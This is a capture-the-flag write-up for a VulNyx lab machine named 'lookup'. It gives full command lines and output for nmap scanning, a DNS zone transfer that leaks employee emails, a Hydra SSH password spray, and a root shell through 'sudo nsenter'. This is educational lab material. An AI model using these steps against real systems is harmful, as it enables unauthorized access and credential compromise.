# lookup

## Executive Summary

| Machine | OS | Author | Category | Platform |
| :--- | :--- | :--- | :--- | :--- |
| lookup | Linux | d4t4s3c | Easy | VulNyx |

**Summary:** The lookup machine presents an external surface comprising OpenSSH on port 22, domain name services on port 53, and an Apache web server on port 80. The web root provides an Under Construction splash page that yields no navigational routes or hidden parameters. Interrogating the DNS service with a reverse PTR lookup against the target IP address resolves the primary nameserver as `ns1.silvertech.nyx`. Executing a full DNS zone transfer query via AXFR against this domain exposes multiple administrative TXT records detailing employee email addresses across internal company departments. By generating a user list from these names and conducting a password spray against the SSH service, valid credentials for `m.bailey` are recovered using the password `b.clark`. After establishing an SSH session and capturing the user flag, inspecting sudo privileges indicates that `m.bailey` is permitted to execute `/usr/bin/nsenter` as root without providing a password. Executing a root shell directly through the `nsenter` binary elevates privileges to root and enables retrieval of both flags.

---

## Reconnaissance

Network discovery begins across the host only subnet to locate the live IP address of the target and map its exposed network services.

1. An ARP ping sweep across the local network reveals the active target at `192.168.56.201`:

```zsh
❯ sudo nmap -sn -PR 192.168.56.0/24                           
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-19 16:38 +0700
Nmap scan report for 192.168.56.100
Host is up (0.00016s latency).
MAC Address: 08:00:27:67:7C:04 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.201
Host is up (0.00081s latency).
MAC Address: 08:00:27:9A:51:45 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.1
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 6.83 seconds
```

2. Assigning the discovered target address to an environment variable is followed by a full TCP port scan, exposing three listening ports:

```zsh
❯ ip=192.168.56.201
```

```zsh
❯ nmap -p- $ip                                       
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-19 16:40 +0700
Nmap scan report for 192.168.56.201
Host is up (0.00014s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 2.26 seconds
```

3. Version and default script detection scans characterize the specific software releases running on ports 22, 53, and 80:

```zsh
❯ nmap -p 22,53,80 -sCV -Pn -T4 --min-rate 5000 $ip  
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-19 16:41 +0700
Nmap scan report for 192.168.56.201
Host is up (0.00091s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 f7:ea:48:1a:a3:46:0b:bd:ac:47:73:e8:78:25:af:42 (RSA)
|   256 2e:41:ca:86:1c:73:ca:de:ed:b8:74:af:d2:06:5c:68 (ECDSA)
|_  256 33:6e:a2:58:1c:5e:37:e1:98:8c:44:b1:1c:36:6d:75 (ED25519)
53/tcp open  domain  Eero device dnsd
| dns-nsid: 
|_  bind.version: not currently available
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Under Construction
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; Device: WAP; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.12 seconds
```

4. An HTTP request to the Apache web server returns a static Under Construction page without dynamic endpoints or sensitive commentary:

```zsh
❯ curl -i http://$ip         
HTTP/1.1 200 OK
Date: Sat, 19 Sep 2026 09:42:11 GMT
Server: Apache/2.4.38 (Debian)
Last-Modified: Sat, 18 Jul 2026 15:56:58 GMT
ETag: "5ef-656e4b91b331a"
Accept-Ranges: bytes
Content-Length: 1519
Vary: Accept-Encoding
Content-Type: text/html

<style>
@import url(https://fonts.googleapis.com/css?family=Montserrat);
@import url(https://fonts.googleapis.com/css?family=Open+Sans:400,700);

h1 {
  margin: 0;
  font-family: 'Montserrat', sans-serif;
  font-size: 4em;
  color: #333;
  -webkit-text-shadow: 0 2px 1px rgba(0, 0, 0, 0.6), 0 0 2px rgba(0, 0, 0, 0.7);
  -moz-text-shadow: 0 2px 1px rgba(0, 0, 0, 0.6), 0 0 2px rgba(0, 0, 0, 0.7);
  text-shadow: 0 2px 1px rgba(0, 0, 0, 0.6), 0 0 2px rgba(0, 0, 0, 0.7);
  word-spacing: 16px;
}

p {
  font-family: 'Open Sans', sans-serif;
  font-size: 1.4em;
  font-weight: bold;
  color: #222;
  text-shadow: 0 0 40px #FFFFFF, 0 0 30px #FFFFFF, 0 0 20px #FFFFFF;
}

.container {
  position: absolute;
  top: 0;
  bottom: 0;
  width: 100%;
  background: url('');
  background-size: cover;
}

.wrapper {
  width: 100%;
  min-height: 100%;
  height: auto;
  display: table;
}

.content {
  display: table-cell;
  vertical-align: middle;
}

.item {
  width: auto;
  height: auto;
  margin: 0 auto;
  text-align: center;
  padding: 8px;
}

@media only screen and (min-width: 800px) {
  h1 {
    font-size: 6em;
  }
  p {
    font-size: 1.6em;
  }
}

@media only screen and (max-width: 320px) {
  h1 {
    font-size: 2em;
  }
  p {
    font-size: 1.2em;
  }
}
</style>

<title>Under Construction</title>

<div class="container">
  <div class="wrapper">
    <div class="content">
      <div class="item">
        <h1>COMING SOON</h1>
        <p>This website is under construction.</p>
      </div>
    </div>
  </div>
</div>
```

5. Because the web server yields no actionable leads, attention shifts to the domain service on port 53, where a reverse PTR DNS query discloses the domain `silvertech.nyx`:

```zsh
❯ dig -x $ip @$ip

; <<>> DiG 9.20.27 <<>> -x 192.168.56.201 @192.168.56.201
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 29513
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 2
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: c30bbf365c80c048cf26d51f6aae5ebcc4a60d951dec6907 (good)
;; QUESTION SECTION:
;201.56.168.192.in-addr.arpa.	IN	PTR

;; ANSWER SECTION:
201.56.168.192.in-addr.arpa. 86400 IN	PTR	ns1.silvertech.nyx.

;; AUTHORITY SECTION:
56.168.192.in-addr.arpa. 86400	IN	NS	ns1.silvertech.nyx.

;; ADDITIONAL SECTION:
ns1.silvertech.nyx.	86400	IN	A	192.168.56.201

;; Query time: 1 msec
;; SERVER: 192.168.56.201#53(192.168.56.201) (UDP)
;; WHEN: Sat Sep 19 17:06:54 WIB 2026
;; MSG SIZE  rcvd: 146
```

6. Performing an unrestricted DNS zone transfer via AXFR reveals company email addresses embedded inside department TXT records:

```zsh
❯ dig axfr silvertech.nyx @$ip

; <<>> DiG 9.20.27 <<>> axfr silvertech.nyx @192.168.56.201
; (1 server found)
;; global options: +cmd
silvertech.nyx.		86400	IN	SOA	ns1.silvertech.nyx. admin.silvertech.nyx. 1 3600 1800 604800 86400
silvertech.nyx.		86400	IN	NS	ns1.silvertech.nyx.
ceo.silvertech.nyx.	86400	IN	TXT	"a.miller@silvertech.nyx"
finance.silvertech.nyx.	86400	IN	TXT	"b.clark@silvertech.nyx"
hr.silvertech.nyx.	86400	IN	TXT	"m.bailey@silvertech.nyx"
it.silvertech.nyx.	86400	IN	TXT	"p.logan@silvertech.nyx"
it.silvertech.nyx.	86400	IN	TXT	"j.carter@silvertech.nyx"
it.silvertech.nyx.	86400	IN	TXT	"r.turner@silvertech.nyx"
it.silvertech.nyx.	86400	IN	TXT	"s.hughes@silvertech.nyx"
ns1.silvertech.nyx.	86400	IN	A	192.168.56.201
support.silvertech.nyx.	86400	IN	TXT	"p.hollen@silvertech.nyx"
www.silvertech.nyx.	86400	IN	A	192.168.56.201
silvertech.nyx.		86400	IN	SOA	ns1.silvertech.nyx. admin.silvertech.nyx. 1 3600 1800 604800 86400
;; Query time: 0 msec
;; SERVER: 192.168.56.201#53(192.168.56.201) (TCP)
;; WHEN: Sat Sep 19 17:07:12 WIB 2026
;; XFR size: 13 records (messages 1, bytes 515)
```

---

## Initial Access

### DNS Information Disclosure and SSH Password Spraying

7. The usernames extracted from the TXT records are assembled into a target user list:

```zsh
❯ for u in a.miller b.clark m.bailey p.logan j.carter r.turner s.hughes p.hollen; do echo $u; done > users.txt
```

8. Hydra sprays the candidate usernames against port 22 using the same username wordlist as passwords, cracking the account `m.bailey` with password `b.clark`:

```zsh
❯ hydra -L users.txt -P users.txt ssh://$ip -t 4 -I 
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-19 17:13:39
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 64 login tries (l:8/p:8), ~16 tries per task
[DATA] attacking ssh://192.168.56.201:22/
[22][ssh] host: 192.168.56.201   login: m.bailey   password: b.clark
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-19 17:14:27
```

9. An interactive SSH session is established as `m.bailey`, providing local system access and confirming the presence of `user.txt`:

```zsh
❯ ssh m.bailey@$ip
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
m.bailey@192.168.56.201's password: 
Linux lookup 4.19.0-24-amd64 #1 SMP Debian 4.19.282-1 (2023-04-29) x86_64
m.bailey@lookup:~$ id;whoami;hostname
uid=1000(m.bailey) gid=1000(m.bailey) grupos=1000(m.bailey)
m.bailey
lookup
m.bailey@lookup:~$ ls
user.txt
```

---

## Privilege Escalation

### Sudo Nsenter Privilege Escalation

10. Checking sudo permissions reveals that user `m.bailey` is allowed to execute `/usr/bin/nsenter` as root without supplying a password:

```zsh
m.bailey@lookup:~$ which sudo
/usr/bin/sudo
m.bailey@lookup:~$ sudo -l
Matching Defaults entries for m.bailey on lookup:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User m.bailey may run the following commands on lookup:
    (root) NOPASSWD: /usr/bin/nsenter
```

11. Executing `/bin/sh` through `sudo nsenter` yields an interactive shell running under the root identity, allowing both flags to be read:

```zsh
m.bailey@lookup:~$ sudo -u root nsenter /bin/sh
# id;whoami;hostname
uid=0(root) gid=0(root) grupos=0(root)
root
lookup
# cat /home/m.bailey/user.txt /root/root.txt
523...
d38...
```

---

## Attack Chain Summary

1. **Reconnaissance**: Network discovery identified the target host, and subsequent TCP port enumeration discovered OpenSSH on port 22, domain name service on port 53, and an Apache web server on port 80.
2. **Vulnerability Discovery**: A reverse DNS query pinpointed the internal nameserver, and an unrestricted DNS zone transfer over AXFR leaked employee email addresses within administrative TXT records.
3. **Exploitation**: The employee usernames were extracted into a target list and sprayed against the SSH service, recovering valid login credentials for user m.bailey.
4. **Internal Enumeration**: Enumerating sudo permissions revealed that user m.bailey was allowed to execute the nsenter binary with root privileges without a password.
5. **Privilege Escalation**: Spawning a shell directly through the sudo nsenter execution granted immediate root privileges, completing the machine compromise and exposing both flags.
